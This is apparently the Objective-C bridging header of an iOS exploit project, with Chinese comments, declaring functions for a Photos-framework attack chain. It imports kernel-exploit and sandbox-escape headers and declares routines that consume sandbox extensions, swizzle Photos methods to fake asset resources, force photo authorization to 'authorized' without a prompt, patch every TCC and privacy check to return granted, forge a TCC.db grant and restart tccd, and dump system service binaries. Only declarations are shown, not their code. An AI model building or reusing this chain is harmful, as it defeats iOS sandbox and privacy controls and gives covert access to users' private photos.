#import "exploit/bad_query.h"
#import "exploit/mcm_bridge.h"
#import "kexploit/kexploit_opa334.h"
#import "kexploit/sandbox_escape.h"
#import "kexploit/kutils.h"
#import "helpers/AppIconHelper.h"
#import "helpers/DisplayIdentity.h"
#import "helpers/MediaAnalysisRace.h"
#import <CommonCrypto/CommonCrypto.h>

// PhotosTraversalProbe: 私有符号桥接（研究用；App 沙盒进程默认无 entitlement，调用会失败，
// 在漏洞场景下由 PhotosServices 返回的 extension 自带允许调用上下文）
extern int sandbox_extension_consume(const char *token);

// PhotosServices 私有管线 objc_msgSend 封装（精确签名，见 AppIconHelper.m）。
// 注意：以 id 开头的 C 函数会被 Clang importer 当作 ObjC 方法式导入，
// 参数全部无标签，Swift 侧必须用位置参数（无标签）调用。
id PHAllocObjCClass(id cls);
// 安全 KVC 注入：@try/@catch 包住 setValue:forKey:，key 不存在/无 setter 时
// 静默返回 NO，不向 Swift 冒 ObjC NSException（否则 SIGABRT）。
// 注：Swift 的 setValue:forKey: 抛出的 NSException 无法被 Swift try 捕获。
BOOL PHSafeSetValueForKey(id obj, id value, NSString *key);
id PHCEIRContextInitWithRequest(id receiver, int64_t requestID, int64_t managerID,
                                id asset, id options, BOOL useRAWAsUnadjustedBase,
                                id resultHandler);
void PHCEIRContextStart(id receiver);
void PHCEIRContextProcessAndReturn(id receiver, id request);
id PHCEIRResultImageSandboxToken(id receiver);
void PHImageManagerRequestCEI(id receiver, id asset, id options, id completion);
// 设备端解析 Photos.framework lazy-import stub → 目标符号名（识别 start 内部 gate）。
// 传入库内 VM 偏移（== dump 偏移，base=0），如 0x247eca0 / 0x24801d0 / 0x247f800。
const char *ResolvePhotosLazyImportSymbol(uint64_t libVMOff);
// 原始 __la_symbol_ptr 槽值（start 前后对比，判定 start 是否真正执行触发了 dyld 绑定）。
uint64_t PhotosLazyImportSlot(uint64_t libVMOff);
// ptrauth_strip + dladdr 版本（dyld4 auth lazy binding 时槽值为 PAC 签名指针）。
const char *ResolvePhotosLazyImportSymbolStrip(uint64_t libVMOff);
// 诊断 ctx 实例：真实类名、是否 respondsTo -start、start IMP 偏移（判定 start 是否可达）。
const char *PhotosContextDebug(id ctx);
// 手动探测 start 内部 gate：模拟 start 开头调 gateCaller(0x247eca0)(ctx) + gate(0x24801d0)(obj,0)，
// 返回 gateCaller 返回对象 class + gate 返回值（判定 start 提前 return 的 gate 语义）。
const char *PhotosProbeGateInfo(id ctx);
// 方向1 试水：伪造 PHAsset 资源读取（swizzle assetResourcesForAsset:/assetResources/resources），
// 让虚拟 asset 的资源读取返回伪造 PHAssetResource（fileURL=fakeURL），验证管线能否推进。
void PHInstallFakeAssetResources(NSURL *fakeURL);
void PHUninstallFakeAssetResources(void);
// 安全驱动：processAndReturnResultsWithRequest: 的 @try 包装（request 可为 nil）。
void PHCEIRContextProcessAndReturnSafe(id receiver, id request);
// resultHandler 回调对象诊断：class 名 + 全量 ivar dump。
const char *PHCEIRResultClass(id obj);
NSString *PHCEIRDumpResultIvars(id obj);
// 管线填充观测：swizzle PHContentEditingInputResult 填充方法，记录是否被调用。
void PHInstallResultObservers(void);
uint64_t PHResultOpMask(void);
// 取 ctx 的真实初始 request（initialRequests），供 processAndReturnResultsWithRequest: 驱动。
id PHCEIRInitialRequests(id receiver);
// dump ctx 前 0x40 字节（offset 8 驱动对象等 slot + 指向对象 class）。
NSString *PHCEIRDumpCtxSlots(id obj);
// 查询 ctx 是否应请求 image/video（_shouldRequestImage / _shouldRequestVideo）。
BOOL PHCEIRShouldRequestImage(id receiver);
BOOL PHCEIRShouldRequestVideo(id receiver);
// 生成 base 媒体请求（_baseMediaRequestsForBaseVersion:），绕过 adjustment 阻塞。
id PHCEIRBaseMediaRequests(id receiver, NSInteger baseVersion);
// 方向2 正常管线注入：hook _renderVideoFromVideoURL:asset:adjustmentData:...
// 替换 adjustmentData 为含相册目录 URL 的 blob，验证正常管线是否把相册目录 URL 交给 MCM。
void PHSetInjectAdjustmentData(id adj);
id PHGetInjectAdjustmentData(void);
void PHInstallRenderAdjInject(void);
// 无授权实验：hook PHPhotoLibrary.authorizationStatus 返回 authorized，无弹窗触发正常管线。
void PHForceAuthorized(void);
// 深度授权门扫描：把已加载类里 authorization/privacy/tcc 相关的整型方法统一改成返回 3，
// 用来判定 fetch 的门在客户端还是 photolibraryd 服务端。返回命中记录（写日志用）。
NSString *PHBypassAllAuthGates(void);

// TCC 服务端伪造（研究用）：photos.service 用调用者 audit token 问 tccd，
// 这里直接查/改 tccd 的答案（写 TCC.db + 重启 tccd）。
// 返回：0=denied 1=unknown 2=allowed 3=limited；-1=libtcc 不可用。
int TCCServerCheckPhotos(void);
NSString *TCCServerCheckDetail(void);
NSString *TCCForgePhotosGrant(void);

// 服务端二进制取样（分析 photolibraryd 为何拒绝本 client）：
// 把 PhotoLibraryServices / PhotoLibraryServicesCore 从已映射镜像写出，
// 并尝试从磁盘复制 /usr/libexec/photolibraryd，产物落 Documents/photodump/。
NSString *PHDumpServiceBinaries(void);
